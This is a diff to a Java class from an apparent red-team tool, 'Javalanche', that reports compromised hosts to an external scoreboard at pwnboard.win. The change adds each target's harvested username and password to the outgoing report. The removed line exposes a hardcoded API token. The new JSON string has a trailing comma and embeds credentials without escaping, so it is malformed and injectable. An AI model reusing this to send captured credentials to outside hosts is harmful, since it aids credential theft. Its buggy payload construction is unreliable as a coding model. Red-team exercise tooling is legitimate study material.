@@ -17,7 +17,7 @@ public class pwnBoardRequest implements Runnable {
     private String pwnboardData;
     private String pwnboardToken;
 
-    public pwnBoardRequest(String IPAddress, String accessType) {
+    public pwnBoardRequest(String IPAddress, String accessType, String username, String password, String pwnboard_api_key) {
         try{
             this.pwnboardUri = new URI("https://pwnboard.win/pwn");
             this.pwnboardUrl = this.pwnboardUri.toURL();
@@ -27,8 +27,10 @@ public class pwnBoardRequest implements Runnable {
             e.printStackTrace();
         }
 
-        pwnboardData  = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"" + accessType + "\"}"; 
-        pwnboardToken = "OyZgkrgMpM0_5U6zIt-auxBr87AdcRMNUPJOak8JqlQ";
+        String accessInfo = "https://www.javalanche.net" + " | " + "Username: " + username + " Password: " + password;
+
+        pwnboardData  = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"" + accessType + "\", \"access_info\": \"" + accessInfo + "\",}"; 
+        pwnboardToken = "Bearer " + pwnboard_api_key;
     }
 
     @Override
